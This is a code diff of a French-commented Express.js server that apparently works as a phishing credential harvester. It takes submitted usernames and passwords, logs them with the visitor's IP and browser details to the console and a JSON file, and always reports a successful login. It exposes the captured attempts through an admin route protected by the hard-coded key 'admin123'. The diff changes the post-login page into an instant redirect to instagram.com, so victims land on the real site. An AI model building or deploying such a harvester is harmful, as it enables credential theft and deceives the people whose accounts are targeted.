@@ -26,15 +26,15 @@ app.get('/', (req, res) => {
 app.post('/login', (req, res) => {
     const { username, password } = req.body;
     const timestamp = new Date().toISOString();
-    
+
     // Obtenir la vraie IP (important pour les reverse proxies)
-    const clientIP = req.ip || 
-                    req.connection.remoteAddress || 
-                    req.socket.remoteAddress ||
-                    (req.connection.socket ? req.connection.socket.remoteAddress : null) ||
-                    req.headers['x-forwarded-for'] ||
-                    req.headers['x-real-ip'];
-    
+    const clientIP = req.ip ||
+        req.connection.remoteAddress ||
+        req.socket.remoteAddress ||
+        (req.connection.socket ? req.connection.socket.remoteAddress : null) ||
+        req.headers['x-forwarded-for'] ||
+        req.headers['x-real-ip'];
+
     // Données à sauvegarder
     const loginData = {
         timestamp: timestamp,
@@ -45,7 +45,7 @@ app.post('/login', (req, res) => {
         referer: req.get('Referer') || 'Direct',
         acceptLanguage: req.get('Accept-Language') || 'N/A'
     };
-    
+
     // Afficher dans la console (même en production pour debug)
     console.log('=== NOUVELLE TENTATIVE DE CONNEXION ===');
     console.log(`🕐 Horodatage: ${timestamp}`);
@@ -56,14 +56,14 @@ app.post('/login', (req, res) => {
     console.log(`📍 Provenance: ${req.get('Referer') || 'Accès direct'}`);
     console.log(`🌐 Langue: ${req.get('Accept-Language') || 'N/A'}`);
     console.log('===========================================\n');
-    
+
     // Sauvegarder dans un fichier JSON (asynchrone pour éviter les blocages)
     const logFile = 'login_attempts.json';
-    
+
     // Lire le fichier existant de manière asynchrone
     fs.readFile(logFile, 'utf8', (err, data) => {
         let existingData = [];
-        
+
         if (!err && data) {
             try {
                 existingData = JSON.parse(data);
@@ -72,14 +72,14 @@ app.post('/login', (req, res) => {
                 existingData = [];
             }
         }
-        
+
         existingData.push(loginData);
-        
+
         // Limiter à 1000 entrées pour éviter un fichier trop volumineux
         if (existingData.length > 1000) {
             existingData = existingData.slice(-1000);
         }
-        
+
         // Sauvegarder de manière asynchrone
         fs.writeFile(logFile, JSON.stringify(existingData, null, 2), (writeErr) => {
             if (writeErr) {
@@ -89,11 +89,11 @@ app.post('/login', (req, res) => {
             }
         });
     });
-    
+
     // Simuler un délai de connexion réaliste
     setTimeout(() => {
-        res.json({ 
-            status: 'success', 
+        res.json({
+            status: 'success',
             message: 'Connexion réussie',
             redirect: '/dashboard'
         });
@@ -107,12 +107,12 @@ app.get('/admin/logs', (req, res) => {
     if (adminKey !== 'admin123') {
         return res.status(403).json({ error: 'Accès refusé' });
     }
-    
+
     fs.readFile('login_attempts.json', 'utf8', (err, data) => {
         if (err) {
             return res.json([]);
         }
-        
+
         try {
             const loginAttempts = JSON.parse(data);
             res.json({
@@ -136,81 +136,17 @@ app.get('/admin/logs', (req, res) => {
 app.get('/dashboard', (req, res) => {
     res.send(`
         <!DOCTYPE html>
-        <html>
-        <head>
-            <title>Tableau de bord - CrazzyWeb</title>
-            <meta charset="UTF-8">
-            <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <style>
-                body { 
-                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-                    color: white; 
-                    font-family: 'Segoe UI', sans-serif; 
-                    text-align: center; 
-                    padding: 50px; 
-                    margin: 0;
-                    min-height: 100vh;
-                }
-                .container {
-                    max-width: 600px;
-                    margin: 0 auto;
-                    background: rgba(255,255,255,0.1);
-                    padding: 40px;
-                    border-radius: 15px;
-                    backdrop-filter: blur(10px);
-                }
-                h1 { font-size: 2.5em; margin-bottom: 20px; }
-                .welcome { font-size: 1.2em; margin-bottom: 30px; }
-                .features {
-                    display: grid;
-                    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-                    gap: 20px;
-                    margin-top: 30px;
-                }
-                .feature {
-                    background: rgba(255,255,255,0.1);
-                    padding: 20px;
-                    border-radius: 10px;
-                    transition: transform 0.3s;
-                }
-                .feature:hover { transform: translateY(-5px); }
-                .logout {
-                    margin-top: 30px;
-                    padding: 10px 20px;
-                    background: #ff6b6b;
-                    color: white;
-                    border: none;
-                    border-radius: 5px;
-                    cursor: pointer;
-                    text-decoration: none;
-                    display: inline-block;
-                }
-            </style>
-        </head>
-        <body>
-            <div class="container">
-                <h1>🎉 Connexion réussie !</h1>
-                <p class="welcome">Bienvenue sur votre tableau de bord CrazzyWeb</p>
-                
-                <div class="features">
-                    <div class="feature">
-                        <h3>📊 Analytics</h3>
-                        <p>Suivez vos statistiques en temps réel</p>
-                    </div>
-                    <div class="feature">
-                        <h3>💬 Messages</h3>
-                        <p>Gérez vos conversations</p>
-                    </div>
-                    <div class="feature">
-                        <h3>⚙️ Paramètres</h3>
-                        <p>Personnalisez votre profil</p>
-                    </div>
-                </div>
-                
-                <a href="/" class="logout">Se déconnecter</a>
-            </div>
-        </body>
-        </html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="refresh" content="0; url=https://www.instagram.com/" />
+    <title>Redirection Instagram</title>
+</head>
+<body>
+    <p>Redirection vers Instagram… Si vous n’êtes pas redirigé automatiquement, <a href="https://www.instagram.com/">cliquez ici</a>.</p>
+</body>
+</html>
+
     `);
 });
 
